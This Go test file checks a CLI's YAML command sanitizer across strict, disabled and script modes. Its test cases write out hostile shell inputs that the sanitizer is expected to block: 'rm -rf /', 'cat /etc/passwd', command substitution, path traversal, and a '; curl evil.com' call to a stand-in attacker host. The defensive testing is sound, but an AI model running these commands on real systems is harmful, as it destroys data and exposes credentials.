package cli

import (
	"strings"
	"testing"

	"github.com/glide-cli/glide/v3/internal/shell"
)

func TestExecuteYAMLCommand_Sanitization(t *testing.T) {
	tests := []struct {
		name    string
		command string
		args    []string
		mode    shell.SanitizationMode
		wantErr bool
		errMsg  string
	}{
		// Safe commands
		{
			name:    "safe command with safe args",
			command: "echo",
			args:    []string{"hello"},
			mode:    shell.ModeStrict,
			wantErr: false,
		},
		{
			name:    "safe command disabled mode",
			command: "echo; rm -rf /",
			args:    []string{},
			mode:    shell.ModeDisabled,
			wantErr: false,
		},

		// Command injection attempts - should be blocked
		{
			name:    "command injection via semicolon",
			command: "echo",
			args:    []string{"test; rm -rf /"},
			mode:    shell.ModeStrict,
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
		{
			name:    "command injection via AND",
			command: "echo",
			args:    []string{"test && cat /etc/passwd"},
			mode:    shell.ModeStrict,
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
		{
			name:    "command injection in command string",
			command: "echo test; rm -rf /",
			args:    []string{},
			mode:    shell.ModeStrict,
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
		{
			name:    "command substitution",
			command: "echo",
			args:    []string{"$(whoami)"},
			mode:    shell.ModeStrict,
			wantErr: true,
			errMsg:  "command substitution",
		},
		{
			name:    "backtick substitution",
			command: "echo",
			args:    []string{"`whoami`"},
			mode:    shell.ModeStrict,
			wantErr: true,
			errMsg:  "command substitution",
		},
		{
			name:    "pipe injection",
			command: "grep",
			args:    []string{"test | sh"},
			mode:    shell.ModeStrict,
			wantErr: true,
			errMsg:  "pipe operator",
		},
		{
			name:    "redirect injection",
			command: "echo",
			args:    []string{"test > /etc/passwd"},
			mode:    shell.ModeStrict,
			wantErr: true,
			errMsg:  "redirection",
		},
		{
			name:    "path traversal",
			command: "cat",
			args:    []string{"../../../../etc/passwd"},
			mode:    shell.ModeStrict,
			wantErr: true,
			errMsg:  "path traversal",
		},
		{
			name:    "newline injection",
			command: "echo",
			args:    []string{"test\nrm -rf /"},
			mode:    shell.ModeStrict,
			wantErr: true,
			errMsg:  "newline injection",
		},

		// Parameter expansion attacks
		{
			name:    "injection via parameter expansion",
			command: "echo $1",
			args:    []string{"; rm -rf /"},
			mode:    shell.ModeStrict,
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
		{
			name:    "injection via $@ expansion",
			command: "docker exec container $@",
			args:    []string{"; curl evil.com"},
			mode:    shell.ModeStrict,
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Set up sanitizer with specified mode
			config := &shell.SanitizerConfig{
				Mode:                tt.mode,
				BlockDangerousChars: true,
				AllowPipes:          false,
				AllowRedirects:      false,
			}
			SetYAMLCommandSanitizer(shell.NewSanitizer(config))

			// Note: We can't actually execute these commands in tests
			// We're only testing the validation logic
			err := yamlCommandSanitizer.Validate(tt.command, tt.args)

			if tt.wantErr && err == nil {
				t.Errorf("ExecuteYAMLCommand() expected error containing '%s', got nil", tt.errMsg)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("ExecuteYAMLCommand() unexpected error: %v", err)
			}
			if tt.wantErr && err != nil && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("ExecuteYAMLCommand() error = %v, want error containing '%s'", err, tt.errMsg)
			}
		})
	}
}

func TestExecuteYAMLCommand_ExpandedValidation(t *testing.T) {
	tests := []struct {
		name    string
		command string
		args    []string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "safe parameter expansion",
			command: "echo $1 $2",
			args:    []string{"hello", "world"},
			wantErr: false,
		},
		{
			name:    "injection attempt caught after expansion",
			command: "echo $1",
			args:    []string{"hello; rm -rf /"},
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
		{
			name:    "injection via $@ caught after expansion",
			command: "docker exec test $@",
			args:    []string{"ls", "&&", "curl", "evil.com"},
			wantErr: true,
			errMsg:  "dangerous pattern",
		},
	}

	// Set up strict sanitizer
	SetYAMLCommandSanitizer(shell.NewSanitizer(shell.DefaultConfig()))

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Test the validation of expanded commands
			// This simulates what happens in ExecuteYAMLCommand after expansion
			err := yamlCommandSanitizer.Validate(tt.command, tt.args)

			if tt.wantErr && err == nil {
				t.Errorf("Expected error containing '%s', got nil", tt.errMsg)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("Unexpected error: %v", err)
			}
			if tt.wantErr && err != nil && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("Error = %v, want error containing '%s'", err, tt.errMsg)
			}
		})
	}
}

func TestSetYAMLCommandSanitizer(t *testing.T) {
	// Test that we can override the sanitizer
	originalSanitizer := yamlCommandSanitizer

	// Set to disabled mode
	disabledSanitizer := shell.NewSanitizer(&shell.SanitizerConfig{
		Mode: shell.ModeDisabled,
	})
	SetYAMLCommandSanitizer(disabledSanitizer)

	if yamlCommandSanitizer.Mode() != shell.ModeDisabled {
		t.Errorf("Expected mode to be disabled, got %v", yamlCommandSanitizer.Mode())
	}

	// Restore original
	SetYAMLCommandSanitizer(originalSanitizer)
}

// TestExecuteYAMLCommand_ActualExecution tests the actual command execution
func TestExecuteYAMLCommand_ActualExecution(t *testing.T) {
	// Save and restore original sanitizer
	originalSanitizer := yamlCommandSanitizer
	defer func() {
		SetYAMLCommandSanitizer(originalSanitizer)
	}()

	tests := []struct {
		name       string
		command    string
		args       []string
		mode       shell.SanitizationMode
		wantErr    bool
		skipReason string
	}{
		{
			name:    "execute safe command - echo",
			command: "echo 'test'",
			args:    []string{},
			mode:    shell.ModeStrict,
			wantErr: false,
		},
		{
			name:    "execute command with safe args",
			command: "echo $1 $2",
			args:    []string{"hello", "world"},
			mode:    shell.ModeStrict,
			wantErr: false,
		},
		{
			name:    "execute true command",
			command: "true",
			args:    []string{},
			mode:    shell.ModeStrict,
			wantErr: false,
		},
		{
			name:    "blocked command - injection attempt",
			command: "echo test; rm -rf /",
			args:    []string{},
			mode:    shell.ModeStrict,
			wantErr: true,
		},
		{
			name:    "blocked args - injection via semicolon",
			command: "echo",
			args:    []string{"test; rm -rf /"},
			mode:    shell.ModeStrict,
			wantErr: true,
		},
		{
			name:    "blocked args - command substitution",
			command: "echo",
			args:    []string{"$(whoami)"},
			mode:    shell.ModeStrict,
			wantErr: true,
		},
		{
			name:    "blocked after expansion",
			command: "echo $1",
			args:    []string{"; cat /etc/passwd"},
			mode:    shell.ModeStrict,
			wantErr: true,
		},
		{
			name:    "disabled mode allows anything",
			command: "echo 'test'",
			args:    []string{},
			mode:    shell.ModeDisabled,
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if tt.skipReason != "" {
				t.Skip(tt.skipReason)
			}

			// Configure sanitizer for this test
			config := &shell.SanitizerConfig{
				Mode:                tt.mode,
				BlockDangerousChars: tt.mode == shell.ModeStrict,
				AllowPipes:          false,
				AllowRedirects:      false,
			}
			SetYAMLCommandSanitizer(shell.NewSanitizer(config))

			// Execute the command
			err := ExecuteYAMLCommand(tt.command, tt.args)

			if tt.wantErr && err == nil {
				t.Errorf("ExecuteYAMLCommand() expected error, got nil")
			}
			if !tt.wantErr && err != nil {
				t.Errorf("ExecuteYAMLCommand() unexpected error: %v", err)
			}
		})
	}
}

// TestExecuteYAMLCommand_CommandValidationStages tests the three validation stages
func TestExecuteYAMLCommand_CommandValidationStages(t *testing.T) {
	originalSanitizer := yamlCommandSanitizer
	defer SetYAMLCommandSanitizer(originalSanitizer)

	// Set up strict sanitizer
	SetYAMLCommandSanitizer(shell.NewSanitizer(shell.DefaultConfig()))

	t.Run("command string validation failure", func(t *testing.T) {
		// This should fail at stage 1: command string validation
		err := ExecuteYAMLCommand("echo; rm -rf /", []string{})
		if err == nil {
			t.Error("Expected error for command with semicolon")
		}
		if err != nil && !strings.Contains(err.Error(), "YAML command validation failed") {
			t.Errorf("Expected 'YAML command validation failed' error, got: %v", err)
		}
	})

	t.Run("arguments validation failure", func(t *testing.T) {
		// This should fail at stage 2: arguments validation
		err := ExecuteYAMLCommand("echo", []string{"; rm -rf /"})
		if err == nil {
			t.Error("Expected error for args with semicolon")
		}
		if err != nil && !strings.Contains(err.Error(), "arguments validation failed") {
			t.Errorf("Expected 'arguments validation failed' error, got: %v", err)
		}
	})

	t.Run("expanded command validation failure", func(t *testing.T) {
		// This should fail at stage 3: expanded command validation
		err := ExecuteYAMLCommand("echo $1", []string{"; malicious"})
		if err == nil {
			t.Error("Expected error for expanded command")
		}
		if err != nil && !strings.Contains(err.Error(), "validation failed") {
			t.Errorf("Expected validation failure error, got: %v", err)
		}
	})

	t.Run("all stages pass", func(t *testing.T) {
		// This should pass all three validation stages
		err := ExecuteYAMLCommand("echo", []string{"hello"})
		if err != nil {
			t.Errorf("Unexpected error for safe command: %v", err)
		}
	})
}

// TestExecuteYAMLCommand_ScriptMode tests the script sanitization mode
func TestExecuteYAMLCommand_ScriptMode(t *testing.T) {
	originalSanitizer := yamlCommandSanitizer
	defer SetYAMLCommandSanitizer(originalSanitizer)

	// Set up script mode sanitizer
	SetYAMLCommandSanitizer(shell.NewSanitizer(shell.ScriptConfig()))

	tests := []struct {
		name    string
		command string
		args    []string
		wantErr bool
		errMsg  string
	}{
		// Script mode allows shell constructs in command
		{
			name:    "allows semicolons in command",
			command: "echo test; echo done",
			args:    []string{},
			wantErr: false,
		},
		{
			name:    "allows pipes in command",
			command: "echo test | grep test",
			args:    []string{},
			wantErr: false,
		},
		{
			name:    "allows command substitution in command",
			command: "echo $(date)",
			args:    []string{},
			wantErr: false,
		},
		{
			name:    "allows newlines in command",
			command: "echo line1\necho line2",
			args:    []string{},
			wantErr: false,
		},
		{
			name:    "allows redirects in command",
			command: "echo test > /dev/null",
			args:    []string{},
			wantErr: false,
		},
		{
			name:    "allows variable expansion in command",
			command: "echo ${HOME}",
			args:    []string{},
			wantErr: false,
		},
		{
			name:    "allows complex shell script",
			command: "if [ -f test ]; then echo exists; else echo missing; fi",
			args:    []string{},
			wantErr: false,
		},
		// Script mode still validates arguments
		{
			name:    "blocks command substitution in args",
			command: "echo",
			args:    []string{"$(whoami)"},
			wantErr: true,
			errMsg:  "command substitution",
		},
		{
			name:    "blocks backtick substitution in args",
			command: "echo",
			args:    []string{"`whoami`"},
			wantErr: true,
			errMsg:  "command substitution",
		},
		// But allows other patterns in args that were blocked in strict mode
		{
			name:    "allows semicolons in args (user input)",
			command: "echo",
			args:    []string{"test; more text"},
			wantErr: false, // User might legitimately pass this as a string
		},
		{
			name:    "allows safe arguments",
			command: "echo",
			args:    []string{"hello", "world"},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := yamlCommandSanitizer.Validate(tt.command, tt.args)

			if tt.wantErr && err == nil {
				t.Errorf("Expected error containing '%s', got nil", tt.errMsg)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("Unexpected error: %v", err)
			}
			if tt.wantErr && err != nil && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("Error = %v, want error containing '%s'", err, tt.errMsg)
			}
		})
	}
}

// TestExecuteShellCommand tests the shell command execution
func TestExecuteShellCommand(t *testing.T) {
	tests := []struct {
		name    string
		command string
		wantErr bool
	}{
		{
			name:    "successful command - echo",
			command: "echo 'test'",
			wantErr: false,
		},
		{
			name:    "successful command - true",
			command: "true",
			wantErr: false,
		},
		{
			name:    "failing command - false",
			command: "false",
			wantErr: true,
		},
		{
			name:    "failing command - nonexistent",
			command: "command_that_does_not_exist_xyz123",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := executeShellCommand(tt.command)
			if tt.wantErr && err == nil {
				t.Error("Expected error, got nil")
			}
			if !tt.wantErr && err != nil {
				t.Errorf("Unexpected error: %v", err)
			}
		})
	}
}
